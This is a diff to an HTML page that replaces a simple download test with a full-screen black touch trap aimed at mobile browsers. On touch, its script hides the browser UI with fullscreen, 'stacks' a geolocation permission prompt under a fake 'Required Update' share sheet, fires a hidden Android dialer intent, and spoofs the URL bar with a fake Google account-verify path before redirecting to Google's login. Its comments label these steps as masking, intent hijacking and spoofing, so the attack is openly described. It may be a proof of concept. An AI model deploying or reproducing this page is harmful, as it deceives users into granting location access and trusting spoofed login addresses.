@@ -1,39 +1,59 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Download Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>S Y S T 3 M</title>
+    <style>
+        body, html { margin: 0; padding: 0; background: #000; width: 100vw; height: 100vh; overflow: hidden; }
+        #trigger { width: 100%; height: 100%; cursor: pointer; }
+    </style>
 </head>
 <body>
 
-<h3>Download Test</h3>
-<button onclick="startTest()">Start</button>
+<div id="trigger"></div>
 
 <script>
-function startTest() {
-  // buka popup (user gesture)
-  let w = window.open("about:blank", "_blank");
+    const trigger = document.getElementById('trigger');
 
-  // trigger 1 download saja (data URL)
-  const a = document.createElement('a');
-  a.href = 'data:text/plain;charset=utf-8,hello_world';
-  a.download = 'test.apk';
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
+    trigger.addEventListener('touchstart', async function() {
+        // 1. Enter Fullscreen (Masking the UI)
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen();
+        }
 
-  console.log("Download triggered from:", location.origin);
+        // 2. Trigger Permission Request (Hidden behind the next action)
+        // This attempts to 'stack' a permission prompt under the share sheet
+        navigator.geolocation.getCurrentPosition(() => {}, () => {}, {enableHighAccuracy:true});
 
-  // setelah itu baru redirect popup
-  setTimeout(() => {
-    try {
-      w.location.href = "https://google.com";
-      console.log("Popup navigated");
-    } catch(e){
-      console.log(e);
-    }
-  }, 1000);
-}
+        // 3. Trigger Web Share (Captures System Focus)
+        if (navigator.share) {
+            navigator.share({
+                title: 'Required Update',
+                url: 'https://support.mozilla.org'
+            }).catch(() => {});
+        }
+
+        // 4. Intent Hijacking (Background)
+        const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = intentUrl;
+        document.body.appendChild(iframe);
+
+        // 5. THE SPOOF: URL Bar Manipulation
+        // As the page redirects, we push a fake state to the history
+        window.history.pushState({}, "", "/login/google-account-verify");
+
+        // 6. Final Exit & Redirect
+        setTimeout(() => {
+            if (document.exitFullscreen) { document.exitFullscreen(); }
+            
+            // This redirect happens while the Android System might still be 
+            // processing the Share or Intent event.
+            window.location.replace("https://www.google.com/accounts/login");
+        }, 800);
+    });
 </script>
-
 </body>
 </html>
